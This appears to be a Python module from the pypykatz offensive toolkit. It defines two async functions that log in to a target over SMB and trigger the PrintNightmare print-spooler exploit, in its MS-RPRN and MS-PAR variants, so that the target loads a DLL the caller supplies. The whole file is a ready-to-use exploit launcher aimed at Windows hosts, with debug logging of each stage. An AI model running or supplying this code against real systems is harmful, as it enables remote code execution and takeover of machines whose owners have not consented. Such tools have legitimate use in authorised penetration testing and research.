import asyncio
import os

from pypykatz import logger

async def printnightmare(url, dll_path, driverpath = None):
    try:
        from aiosmb.commons.connection.factory import SMBConnectionFactory
        from aiosmb.commons.interfaces.machine import SMBMachine
        
        smburl = SMBConnectionFactory.from_url(url)
        connection = smburl.get_connection()

        async with connection:
            logger.debug('[PRINTNIGHTMARE] Connecting to server...')
            _, err = await connection.login()
            if err is not None:
                raise err
            
            machine = SMBMachine(connection)
            logger.debug('[PRINTNIGHTMARE] Connected!')
            logger.debug('[PRINTNIGHTMARE] Triggering printnightmare...')
            _, err = await machine.printnightmare(dll_path, driverpath)
            if err is not None:
                raise err
            logger.debug('[PRINTNIGHTMARE] Printnightmare finished OK!')
            return True, None
    except Exception as e:
        import traceback
        traceback.print_exc()
        return None, e

async def parprintnightmare(url, dll_path, driverpath = None):
    try:
        from aiosmb.commons.connection.factory import SMBConnectionFactory
        from aiosmb.commons.interfaces.machine import SMBMachine
        
        smburl = SMBConnectionFactory.from_url(url)
        connection = smburl.get_connection()

        async with connection:
            logger.debug('[PARPRINTNIGHTMARE] Connecting to server...')
            _, err = await connection.login()
            if err is not None:
                raise err
            
            machine = SMBMachine(connection)
            logger.debug('[PARPRINTNIGHTMARE] Connected!')
            logger.debug('[PARPRINTNIGHTMARE] Triggering parprintnightmare...')
            _, err = await machine.par_printnightmare(dll_path, driverpath)
            if err is not None:
                raise err
            logger.debug('[PARPRINTNIGHTMARE] Parprintnightmare finished OK!')
            return True, None
    except Exception as e:
        import traceback
        traceback.print_exc()
        return None, e